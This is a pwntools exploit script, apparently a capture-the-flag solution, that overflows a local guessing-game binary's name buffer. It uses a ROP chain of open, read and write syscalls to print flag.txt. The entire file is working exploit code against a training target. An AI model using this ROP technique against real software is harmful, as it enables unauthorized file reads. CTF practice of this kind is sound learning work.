#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Gadgets
pop_rdi = 0x4006a6
pop_rsi = 0x410b93
pop_rdx = 0x410602
pop_rax = 0x4005af
pop_rdx_rsi = 0x44c9a9
mov_rdx_rax = 0x419027
syscall = 0x40138c
writable_addr = 0x6bc3a0

# Probar localmente
io = process('/workspace/vuln')

io.recvuntil(b'What number would you like to guess?\n')
io.sendline(b'84')

io.recvuntil(b'Name? ')

payload = b'A' * 112
payload += b'B' * 8

# Escribir "flag.txt" en .bss
payload += p64(pop_rax) + b'flag.txt'
payload += p64(pop_rdx) + p64(writable_addr)
payload += p64(mov_rdx_rax)

# open
payload += p64(pop_rax) + p64(2)
payload += p64(pop_rdi) + p64(writable_addr)
payload += p64(pop_rsi) + p64(0)
payload += p64(syscall)

# read
payload += p64(pop_rax) + p64(0)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rdx_rsi) + p64(100) + p64(writable_addr + 100)
payload += p64(syscall)

# write
payload += p64(pop_rax) + p64(1)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rdx_rsi) + p64(100) + p64(writable_addr + 100)
payload += p64(syscall)

print(f"Payload length: {len(payload)}")

io.sendline(payload)

# Ver output
try:
    output = io.recvall(timeout=3)
    print("Output:")
    print(output)
    
    if b'pico' in output.lower():
        print("\n[+] Flag found!")
except Exception as e:
    print(f"Exception: {e}")

io.close()
